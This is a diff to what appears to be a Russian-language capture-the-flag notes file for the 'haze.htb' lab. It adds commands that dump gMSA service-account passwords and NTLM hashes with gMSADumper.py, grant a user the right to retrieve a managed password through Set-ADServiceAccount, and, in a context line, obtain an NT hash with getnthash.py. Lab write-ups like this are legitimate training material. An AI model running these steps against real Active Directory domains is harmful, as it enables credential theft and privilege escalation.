@@ -102,3 +102,18 @@ Silvercore_21
 
  python getnthash.py -key b5fbdc5fe339b991ac044d8e82fcabf94e01cc86feeaba0be192391073d0b5e0 haze.htb/edward.martin
 
+# ЧитатьGMSAPassword 
+
+    кто может прочитать пароль закрытой службы (учетной записи)
+    python gMSADumper.py -u 'mark.adams' -p 'Ld@p_Autxxxxxxxxxxx' -d haze.htb
+
+    также 
+    Get-ADServiceAccount -Identity Haze-IT-Backup$ | Select-Object Name, ObjectClass
+
+    если Марк входит в группу администраторов gMSA
+    Set-ADServiceAccount -Identity "Haze-IT-Backup$" -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"
+    Get-ADServiceAccount -Identity "Haze-IT-Backup$" -Properties PrincipalsAllowedToRetrieveManagedPassword
+
+    получить NTLM закрытой учетки GMSA
+    python gMSADumper.py -u 'mark.adams' -p 'password' -d haze.htb -l dc01.haze.htb
+
